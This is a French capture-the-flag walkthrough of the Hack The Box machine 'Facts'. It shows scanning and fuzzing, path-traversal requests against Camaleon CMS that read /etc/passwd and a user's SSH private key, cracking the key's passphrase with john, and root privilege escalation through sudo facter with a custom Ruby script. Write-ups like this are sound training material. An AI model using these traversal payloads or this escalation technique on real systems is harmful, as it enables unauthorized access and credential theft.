  # Facts

	echo "10.129.244.96 facts.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.129.244.96 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.129.244.96 -oN nmap.txt
	
Scans classiques.
Résultats : 

    PORT      STATE SERVICE REASON  VERSION
    22/tcp    open  ssh     syn-ack OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
    80/tcp    open  http    syn-ack nginx 1.26.3 (Ubuntu)
    54321/tcp open  unknown syn-ack

Fuzzing web : 

    feroxbuster --silent -u http://facts.htb
    ffuf -u http://facts.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
    ffuf -u http://facts.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt


Interface admin mais avec possibilité de s'enregistrer : 

    http://facts.htb/admin/login
    http://facts.htb/admin/register

Après enregistrement on voit un petit "Camaleon CMS" en bas et il existe quelques CVE intéressants : 
- https://securitylab.github.com/advisories/GHSL-2024-182_GHSL-2024-186_Camaleon_CMS/

En prenant celui sur la traversée de chemin, on a bien le fichier /etc/passwd : 

    http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd

Deux utilisateurs avec shell : 

```
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

Wordlists de fichiers pour Intruder : 
- https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux
- https://gist.github.com/Mayfly277/63cce795df23f21b86aefa84ce9171e1


Pas de killer dans ces fichiers, mais on a une clé SSH pour trivia : 

    GET /admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519 

En essayant la clé, le serveur demande une passphrase mais elle est cassable facilement : 

    vim trivia_id
    chmod 600 trivia_id
    
    ssh2john trivia_id > trivia_id_john
    john --wordlist=/mnt/c/Tools/rockyou.txt trivia_id_john
    
    ssh trivia@facts.htb -i trivia_id

Droit de lecture sur le flag utilisateur : 

    cat /home/william/user.txt
    	 

## Élévation de privilèges

	sudo -l
    
> (ALL) NOPASSWD: /usr/bin/facter

Ce programme est un script Ruby qui semble utiliser Facter. 

Facter est un outil écrit en Ruby, utilisé pour collecter des informations système. Lorsqu'il est exécuté, Facter cherche des fichiers personnalisés (scripts Ruby) à exécuter. Avec sudo, les scripts Ruby qu'il charge s'exécutent avec les privilèges de root

Même si l'option "env_reset" est activée (ce qui empêche l'utilisation de la variable d'environnement FACTERLIB), il existe un autre moyen de spécifier un répertoire personnalisé avec "--custom-dir" : 

    cd /tmp
    vim exp.rb
    sudo /usr/bin/facter --custom-dir=/tmp/
    cat /tmp/root.txt
    
    
Script Ruby qui copie le flag et modifie ses permissions : 

```
#!/usr/bin/ruby

require 'fileutils'

FileUtils.cp('/root/root.txt', '/tmp/root.txt')
FileUtils.chmod(0777, '/tmp/root.txt')
```
